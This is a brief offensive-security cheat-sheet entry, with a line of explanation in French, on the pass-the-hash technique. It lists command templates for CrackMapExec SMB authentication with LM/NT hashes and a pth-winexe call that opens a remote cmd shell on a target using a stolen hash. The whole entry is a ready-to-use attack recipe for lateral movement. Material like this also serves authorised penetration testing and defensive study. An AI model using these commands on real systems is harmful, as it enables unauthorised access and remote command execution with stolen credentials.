# Pass The Hash

```
cme smb <IP> -u <USER> -H <LM-HASH>:<NT-HASH>
cme smb <IP> -u <USER> -H <NT-HASH>

pth-winexe -U <USER>%<LM-HASH>:<NT-HASH> //<IP> cmd
```

Les _hashs_ NT (a.k.a NTLM) peuvent être utilisés.
